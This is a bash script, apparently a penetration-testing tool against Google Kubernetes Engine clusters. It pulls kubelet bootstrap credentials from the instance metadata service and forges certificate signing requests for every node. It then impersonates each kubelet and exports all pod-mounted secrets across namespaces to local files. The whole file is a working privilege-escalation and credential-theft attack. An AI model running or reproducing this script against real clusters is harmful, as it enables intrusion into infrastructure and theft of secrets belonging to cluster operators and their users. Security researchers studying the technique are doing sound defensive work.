#!/usr/bin/env bash

# Global vars
BINARIES="curl awk sed grep base64 openssl"
KUBE_ENV_URL="http://169.254.169.254/computeMetadata/v1/instance/attributes/kube-env"
KUBE_ENV_FILE="kube-env"
CA_CERT_PEM="ca.crt"
KUBELET_BOOTSTRAP_CERT="kubelet-bootstrap.crt"
KUBELET_BOOTSTRAP_KEY="kubelet-bootstrap.key"
KUBE_HOSTNAME_URL="http://169.254.169.254/computeMetadata/v1/instance/hostname"
CURRENT_HOSTNAME=""
hexchars="0123456789ABCDEF"
SUFFIX="$( for i in {1..4} ; do echo -n ${hexchars:$(( $RANDOM % 16 )):1} ; done )"
OPENSSL_CNF="openssl.cnf"
KUBELET_EC_KEY="kubelet.key"
KUBELET_EC_CERT="kubelet.crt"
KUBELET_CSR="kubelet.csr"
KUBELET_CSR_YAML="kubelet-csr.yaml"
ALL_NODE_NAMES=""
NS_POD_SECRETS="ns-pod-secret-listing.txt"

# Functions
function print-status {
  echo "[[ ${@} ]]"
} 

function check-binaries {
  # Ensure we have the needed binaries
  for binary in ${BINARIES}; do
    print-status "Checking if ${binary} exists"
    which ${binary} 2> /dev/null 1> /dev/null
    if [[ $? -ne 0 ]]; then
      echo "ERROR: Script requires ${binary}, but it was not found in the path. Aborting."
      exit 1
    fi
  done
}

function get-kube-env {
  # Obtain the kube-env via the metadata URL
  print-status "Obtain kube-env"
  if [ ! -f "${KUBE_ENV_FILE}" ]; then
    # convert into bash formatted vars (three we don't need break formatting/escaping so we grep them out)
    curl -s -H "Metadata-flavor: Google" "${KUBE_ENV_URL}" | grep -v "EVICTION" | grep -v "KUBELET_TEST_ARGS" | grep -v "EXTRA_DOCKER_OPTS" | sed -e 's/: /=/g' > "${KUBE_ENV_FILE}"
  fi
}

function source-kube-env {
  print-status "Source kube-env"
  source "${KUBE_ENV_FILE}"
}

function get-bootstrap-certs {
  # Write the public CA cert, kubelet-bootstrap cert, and kubelet-bootstrap.key
  print-status "Get bootstrap certificate data"
  if [[ ! -d bootstrap ]]; then
    mkdir -p bootstrap
  fi
  echo "${CA_CERT}" | base64 -d > "bootstrap/${CA_CERT_PEM}"
  echo "${KUBELET_CERT}" | base64 -d > "bootstrap/${KUBELET_BOOTSTRAP_CERT}"
  echo "${KUBELET_KEY}" | base64 -d > "bootstrap/${KUBELET_BOOTSTRAP_KEY}"
}

function get-hostname {
  # Obtain the hostname via the metadata URL
  print-status "Obtain the Hostname"
  CURRENT_HOSTNAME="$(curl -s -H 'Metadata-flavor: Google' ${KUBE_HOSTNAME_URL} | awk -F. '{print $1}')"
}

function get-kubectl {
  # Fetch the latest kubectl binary if needed
  print-status "Get kubectl binary"
  if [ ! -f kubectl ]; then
    curl -s -LO https://storage.googleapis.com/kubernetes-release/release/$(curl -s https://storage.googleapis.com/kubernetes-release/release/stable.txt)/bin/linux/amd64/kubectl
    chmod +x kubectl
  fi
}

function generate-openssl-cnf {
  # Generate a host-specific openssl.cnf for use with the CSR generation
  print-status "Create nodes/${1}/${OPENSSL_CNF}"
  cat << EOF > "nodes/${1}/${OPENSSL_CNF}"
[ req ]
prompt = no
encrypt_key = no
default_md = sha256
distinguished_name = dname

[ dname ]
O = system:nodes
CN = system:node:${1}
EOF
}

function generate-ec-keypair {
  # Generate a per-host EC keypair
  print-status "Generate EC kubelet keypair for ${1}"
  if [ ! -f "nodes/${1}/${KUBELET_EC_KEY}" ]; then
    openssl ecparam -genkey -name prime256v1 -out "nodes/${1}/${KUBELET_EC_KEY}"
  fi
}

function generate-csr {
  # Genreate the CSR using the per-host openssl.cnf and EC keypair
  print-status "Generate CSR for ${1}"
  if [ ! -f "nodes/${1}/${KUBELET_CSR}" ]; then
    openssl req -new -config "nodes/${1}/${OPENSSL_CNF}" -key "nodes/${1}/${KUBELET_EC_KEY}" -out "nodes/${1}/${KUBELET_CSR}"
  fi
}

function generate-csr-yaml {
  # Prepare the CSR object for submission to K8s
  print-status "Generate CSR YAML for ${1}"
cat <<EOF > "nodes/${1}/${KUBELET_CSR_YAML}"
apiVersion: certificates.k8s.io/v1beta1
kind: CertificateSigningRequest
metadata:
  name: node-csr-${1}-${SUFFIX}
spec:
  groups:
  - system:authenticated
  request: $(cat nodes/${1}/${KUBELET_CSR} | base64 | tr -d '\n')
  usages:
  - digital signature
  - key encipherment
  - client auth
  username: kubelet
EOF
}

function generate-certificate {
  # Submit the CSR object, wait a second, and then fetch the signed/approved certificate file
  print-status "Submit CSR and Generate Certificate for ${1}"
  ./kubectl create -f "nodes/${1}/${KUBELET_CSR_YAML}" --server="https://${KUBERNETES_MASTER_NAME}" --certificate-authority="bootstrap/${CA_CERT_PEM}" --client-certificate="bootstrap/${KUBELET_BOOTSTRAP_CERT}" --client-key="bootstrap/${KUBELET_BOOTSTRAP_KEY}"
  
  print-status "Sleep 2 while being approved"
  sleep 2
  
  print-status "Download approved Cert for ${1}"
  ./kubectl --server="https://${KUBERNETES_MASTER_NAME}" --certificate-authority="bootstrap/${CA_CERT_PEM}" --client-certificate="bootstrap/${KUBELET_BOOTSTRAP_CERT}" --client-key="bootstrap/${KUBELET_BOOTSTRAP_KEY}" get csr "node-csr-${1}-${SUFFIX}" -o jsonpath='{.status.certificate}' | base64 -d > "nodes/${1}/${KUBELET_EC_CERT}"

}

function dump-secrets {
  # Use the kubelet's permissions to dump the secrets it can access
  print-status "Dumping secrets mounted to ${1}"
  if [[ ! -d secrets ]]; then
    mkdir -p secrets
  fi
  for i in $(./kubectl --server="https://${KUBERNETES_MASTER_NAME}" --certificate-authority="bootstrap/${CA_CERT_PEM}" --client-certificate="nodes/${1}/${KUBELET_EC_CERT}" --client-key="nodes/${1}/${KUBELET_EC_KEY}" get pods --all-namespaces -o=jsonpath='{range .items[*]}{.metadata.namespace}{"|"}{.spec.volumes[*].secret.secretName}{"\n"}{end}' | sort -u); do
    NS=$(echo $i | awk -F\| '{print $1}')
    SECRET=$(echo $i | awk -F\| '{print $2}')
    if [[ ! -z "${SECRET}" ]]; then
      ./kubectl --server="https://${KUBERNETES_MASTER_NAME}" --certificate-authority="bootstrap/${CA_CERT_PEM}" --client-certificate="nodes/${1}/${KUBELET_EC_CERT}" --client-key="nodes/${1}/${KUBELET_EC_KEY}" -n "${NS}" get secret "${SECRET}" 2> /dev/null 1> /dev/null
      if [[ $? -eq 0 ]]; then
        echo "Exporting secrets/${NS}-${SECRET}.json"
        ./kubectl --server="https://${KUBERNETES_MASTER_NAME}" --certificate-authority="bootstrap/${CA_CERT_PEM}" --client-certificate="nodes/${1}/${KUBELET_EC_CERT}" --client-key="nodes/${1}/${KUBELET_EC_KEY}" -n "${NS}" get secret "${SECRET}" -o=json > "secrets/${NS}-${SECRET}.json"
      fi
    fi
  done
}

function get-pods-list {
  # Fetches a full pod listing to know which secrets are tied to which pods
  print-status "Download a full pod listing"
  ./kubectl --server="https://${KUBERNETES_MASTER_NAME}" --certificate-authority="bootstrap/${CA_CERT_PEM}" --client-certificate="nodes/${1}/${KUBELET_EC_CERT}" --client-key="nodes/${1}/${KUBELET_EC_KEY}" get pods --all-namespaces -o json > dumps/allpods.json
}

function get-nodes-list {
  # Fetch the listing of nodes in the cluster from K8s
  print-status "Get node names"
  ALL_NODE_NAMES="$(./kubectl --server=https://${KUBERNETES_MASTER_NAME} --certificate-authority=bootstrap/${CA_CERT_PEM} --client-certificate=nodes/${1}/${KUBELET_EC_CERT} --client-key=nodes/${1}/${KUBELET_EC_KEY} get nodes -o=jsonpath='{.items[*].metadata.name}')"
}

function impersonate-kubelet {
  # All the steps to get per-node credentials and dump the secrets it can access
  if [[ ! -d nodes/${1} ]]; then
    mkdir -p nodes/${1}
  fi
  if [[ ! -d dumps ]]; then
    mkdir -p dumps
  fi
  generate-openssl-cnf "${1}"
  generate-ec-keypair "${1}"
  generate-csr "${1}"
  generate-csr-yaml "${1}"
  generate-certificate "${1}"
  dump-secrets "${1}"
}

function iterate-through-nodes {
  # Find and iterate through all the other nodes in the cluster
  print-status "Iterate through all other node names"
  for i in ${ALL_NODE_NAMES}; do
    if [[ "${i}" != "${1}" ]]; then
      impersonate-kubelet "${i}"
    fi
  done
}

function print-ns-pod-secrets {
  # Extracts and prints namespace, podname, and secret
  print-status "Extracting namespace, podname, and secret listing"
  ./kubectl --server="https://${KUBERNETES_MASTER_NAME}" --certificate-authority="bootstrap/${CA_CERT_PEM}" --client-certificate="nodes/${1}/${KUBELET_EC_CERT}" --client-key="nodes/${1}/${KUBELET_EC_KEY}" get pods --all-namespaces -o=jsonpath='{range .items[*]}{.metadata.namespace}{"|"}{.metadata.name}{"|"}{.spec.volumes[*].secret.secretName}{"\n"}{end}' | sort -u > "dumps/${NS_POD_SECRETS}"
}

# Logic begins here
check-binaries
get-kube-env
source-kube-env
get-bootstrap-certs
get-kubectl
get-hostname
impersonate-kubelet "${CURRENT_HOSTNAME}"
get-pods-list "${CURRENT_HOSTNAME}"
get-nodes-list "${CURRENT_HOSTNAME}"
iterate-through-nodes "${CURRENT_HOSTNAME}"
print-ns-pod-secrets "${CURRENT_HOSTNAME}"
